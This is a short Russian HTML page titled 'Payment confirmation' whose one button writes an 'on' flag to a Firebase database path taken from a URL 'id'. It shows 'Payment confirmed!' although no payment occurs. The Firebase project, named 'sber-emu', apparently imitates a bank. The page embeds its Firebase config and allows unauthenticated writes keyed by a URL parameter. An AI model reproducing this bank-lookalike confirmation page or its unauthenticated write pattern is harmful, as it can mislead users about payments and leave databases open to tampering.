<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Подтверждение оплаты</title>
<style>
  body {
    margin: 0;
    font-family: 'Arial', sans-serif;
    background: #000; /* чёрный фон */
    color: #00ff00;   /* зелёный текст */
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .container {
    text-align: center;
    background: #111;
    padding: 40px 20px;
    border-radius: 20px;
    box-shadow: 0 0 20px #00ff00aa;
    width: 90%;
    max-width: 400px;
  }
  h1 {
    font-size: 24px;
    margin-bottom: 30px;
  }
  button {
    background: #00ff00;
    color: #000;
    border: none;
    border-radius: 12px;
    padding: 15px 25px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
  }
  button:hover {
    background: #00cc00;
  }
  .message {
    margin-top: 20px;
    font-size: 18px;
    display: none;
  }
</style>

<!-- Firebase SDK -->
<script type="module">
  // Импортируем Firebase SDK
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-analytics.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

  // Конфиг твоего Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyBOKqaUE5Zi_ZSL7eSYyby_AjA603SOzQk",
    authDomain: "sber-emu.firebaseapp.com",
    databaseURL: "https://sber-emu-default-rtdb.firebaseio.com",
    projectId: "sber-emu",
    storageBucket: "sber-emu.firebasestorage.app",
    messagingSenderId: "704050354843",
    appId: "1:704050354843:web:9aec7c849444deb092843e",
    measurementId: "G-GVXLTS6SL3"
  };

  // Инициализация Firebase
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const database = getDatabase(app);

  // Получаем ID из URL
  function getUserID() {
    const params = new URLSearchParams(window.location.search);
    return params.get('id');
  }

  // Подтверждение оплаты через Firebase
  window.confirmPayment = async function() {
    const id = getUserID();
    if (!id) {
      alert("ID пользователя не найден!");
      return;
    }

    try {
      await set(ref(database, `${id}/Mobile`), "on");
      document.querySelector(".message").textContent = "Оплата подтверждена!";
      document.querySelector(".message").style.display = "block";
      document.querySelector("button").disabled = true;
    } catch (e) {
      alert("Ошибка Firebase: " + e);
    }
  };
</script>
</head>
<body>
<div class="container">
  <h1>Подтвердить оплату?</h1>
  <button onclick="confirmPayment()">Подтвердить</button>
  <div class="message"></div>
</div>
</body>
</html>
